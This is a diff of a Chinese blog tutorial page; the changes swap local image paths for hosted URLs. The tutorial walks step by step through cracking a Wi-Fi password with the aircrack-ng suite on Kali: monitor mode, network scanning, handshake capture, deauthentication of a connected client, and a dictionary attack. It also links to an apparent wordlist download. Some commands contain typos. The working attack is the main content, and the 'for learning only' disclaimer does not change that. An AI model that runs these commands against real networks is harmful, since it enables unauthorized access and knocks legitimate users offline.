@@ -95,7 +95,7 @@ var _hmt = _hmt || [];
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">992</span>
+            <span class="post-count">818</span>
         </span>
     </span>
 
@@ -128,25 +128,25 @@ var _hmt = _hmt || [];
 <h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><h3 id="查看已安装网卡"><a href="#查看已安装网卡" class="headerlink" title="查看已安装网卡"></a>查看已安装网卡</h3><p>以下的操作都需要提升权限，默认的root密码都是kali</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#提升权限</span><br><span class="line">sudo su</span><br><span class="line">#查看网卡</span><br><span class="line">airmon-ng</span><br></pre></td></tr></table></figure>
 
-<p>![](D:\Program Files\PicGo\临时储存\0f984e61bb8243799fa7ee772f56cce3.png)<br> 如果没有，请注意是否开启了网卡在虚拟机的连接，如下图<br>![](D:\Program Files\PicGo\临时储存\5561d1c2b99e40c8b903ffdffcaf5395.png)</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210428371.png"><br> 如果没有，请注意是否开启了网卡在虚拟机的连接，如下图<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210430334.png"></p>
 <p>打开一个终端窗口</p>
 <h3 id="开启网卡监控"><a href="#开启网卡监控" class="headerlink" title="开启网卡监控"></a>开启网卡监控</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#开启网卡监控</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
 
-<p>![](D:\Program Files\PicGo\临时储存\828d90016c414c8fbb572ce32ec9e908.png)<br> 可以使用命令看看网卡的名字是否改变</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431501.png"><br> 可以使用命令看看网卡的名字是否改变</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
 
-<p>![](D:\Program Files\PicGo\临时储存\1c33484e427c435da96dcf4a09c336c5.png)<br> 可以看到最后的那个名字已经改变</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431574.png"><br> 可以看到最后的那个名字已经改变</p>
 <h3 id="扫描wifi"><a href="#扫描wifi" class="headerlink" title="扫描wifi"></a>扫描wifi</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
 
-<p>我们选择这个名叫adcd的wifi进行破解<br> ![](D:\Program Files\PicGo\临时储存\87722c3e7a644ab589f80aa5e8ffc1b4.png)</p>
+<p>我们选择这个名叫adcd的wifi进行破解<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431426.png"></p>
 <h3 id="等待抓取握手包"><a href="#等待抓取握手包" class="headerlink" title="等待抓取握手包"></a>等待抓取握手包</h3><p>上述方法后，按<code>ctrl+c</code>，退出扫描</p>
 <p>输入命令</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -w freedom -c <span class="number">11</span> --bssid 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC wlan0mon -ignore-nefative-oneaa</span><br></pre></td></tr></table></figure>
 
 <p>-c：指定信道<br> -w：指定抓去握手包的存放位置或者名字，freedom是一会抓去的握手包的名字<br> –bssid：指定路由器的MAC</p>
 <p>需要更改两个参数，信道和地址，这两个参数分别是扫描wifi时确定要破解的wifi参数</p>
-<p>![](D:\Program Files\PicGo\临时储存\1cfe2fd74500410caa8c763630a52acb.png)]</p>
-<p>![](D:\Program Files\PicGo\临时储存\6e78ae34eff944c9ad4fcdaec895b6d3.png)<br> 回车后，如下界面<br> ![](D:\Program Files\PicGo\临时储存\f7cb4d8e175a4672841a391c490e1638.png)<br> 从这个界面可以看出，选定的wifi一共有一个人连接，没有人连接的wifi是无法破解的</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431403.png">]</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432076.png"><br> 回车后，如下界面<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432332.png"><br> 从这个界面可以看出，选定的wifi一共有一个人连接，没有人连接的wifi是无法破解的</p>
 <h3 id="爆破-抓取握手包"><a href="#爆破-抓取握手包" class="headerlink" title="爆破 抓取握手包"></a>爆破 抓取握手包</h3><p>这个步骤，说白了，就是将一个用户踢下线，让他重新连接WIFI，这样我们就能监听并且截取到握手包</p>
 <p>重启一个终端窗口，一样的，申请管理员权限，密码默认：kali</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
@@ -155,14 +155,14 @@ var _hmt = _hmt || [];
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">2</span> -a 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC -c A4:<span class="number">50</span>:<span class="number">46</span>:D8:<span class="number">74</span>:<span class="number">29</span> wlan0mon</span><br></pre></td></tr></table></figure>
 
 <p>-a：指定路由器的MAC<br> -c：指定客户机的MAC</p>
-<p>![](D:\Program Files\PicGo\临时储存\9cd8fb3418754a0591d58594c3cfe867.png)<br> 执行成功后如上图，表明该客户机以及被成功的踢下线，我们要做的就是等待客户机重新连接，他只要重新连接了，我们就能抓到握手包，进行跑字典破解</p>
-<h3 id="抓取成功"><a href="#抓取成功" class="headerlink" title="抓取成功"></a>抓取成功</h3><p>当第四步的终端窗口出现如下<br> ![](D:\Program Files\PicGo\临时储存\239165e4b0b2424a90ed6c2908feee05.png)<br> 表明成功抓取到握手包，进行下一个步骤<br> <strong>注意！！这里抓到包一定要按<code>ctrl+c</code>退出抓包，不然抓到的握手包用不了哦</strong></p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432483.png"><br> 执行成功后如上图，表明该客户机以及被成功的踢下线，我们要做的就是等待客户机重新连接，他只要重新连接了，我们就能抓到握手包，进行跑字典破解</p>
+<h3 id="抓取成功"><a href="#抓取成功" class="headerlink" title="抓取成功"></a>抓取成功</h3><p>当第四步的终端窗口出现如下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432057.png"><br> 表明成功抓取到握手包，进行下一个步骤<br> <strong>注意！！这里抓到包一定要按<code>ctrl+c</code>退出抓包，不然抓到的握手包用不了哦</strong></p>
 <h3 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h3><p>包在<code>**/home/kali/**</code>文件夹下，找到名叫<code>freedom-01.ivs</code>文件，这个就是抓到的包</p>
-<p>![](D:\Program Files\PicGo\临时储存\e3e22cdc5c484ae2851ad05e7c2b23b8.png)<br> 然后就是字典，我个人建议将字典一同放在该目录下<br> ![](D:\Program Files\PicGo\临时储存\19e91bb20165451cbfb5f0f67ce01ea3.png)<br> 然后再次重起一个终端窗口，输入如下命令</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432141.png"><br> 然后就是字典，我个人建议将字典一同放在该目录下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432350.png"><br> 然后再次重起一个终端窗口，输入如下命令</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ircrack-ng -w pass.txt freedom-*.ivs</span><br></pre></td></tr></table></figure>
 
-<p>![](D:\Program Files\PicGo\临时储存\73e09f2fee8348318e988946fd42dcd0.png)<br> 回车开始解密<br> ![请添加图片描述](D:\Program Files\PicGo\临时储存\c9916c1bdcfe4b169d964f9f93ff1ace.png)<br> <strong>能否成功看字典的是否强大，也看脸</strong></p>
-<p>成功界面<br>![请添加图片描述](D:\Program Files\PicGo\临时储存\d108b850614d4dd99d7b052d9887d04a.png)<br> 失败界面<br>![](D:\Program Files\PicGo\临时储存\10df7d7cad3749828c5be1975b2e4e34.png)</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432497.png"><br> 回车开始解密<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432365.png" alt="请添加图片描述"><br> <strong>能否成功看字典的是否强大，也看脸</strong></p>
+<p>成功界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433429.png" alt="请添加图片描述"><br> 失败界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433725.png"></p>
 <h2 id="温馨提示"><a href="#温馨提示" class="headerlink" title="温馨提示"></a>温馨提示</h2><hr>
 <p><strong>kali学的好，牢饭少不了<br> 本教程仅用于学习，请大家谨慎使用</strong></p>
 <p>需要的还是度盘自提吧：<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw">https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw</a><br>提取码：lbxk</p>
